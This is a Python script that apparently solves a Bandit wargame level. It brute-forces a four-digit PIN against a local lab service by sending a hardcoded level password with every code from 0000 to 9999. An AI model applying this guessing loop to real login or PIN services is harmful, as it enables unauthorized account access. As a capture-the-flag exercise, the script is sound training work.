import socket
import sys

bandit23pwd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 30002))

welcome_msg = s.recv(2048)
print(welcome_msg)

try:
    for i in range(10000):
        pin = str(i).zfill(4)
        pincode_string= bandit23pwd +" "+ pin +"\n"
        s.sendall(pincode_string.encode())
        receive_msg = s.recv(1024)
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pin)
        else:
            print(receive_msg)
            s.close()
finally:
    sys.exit(1)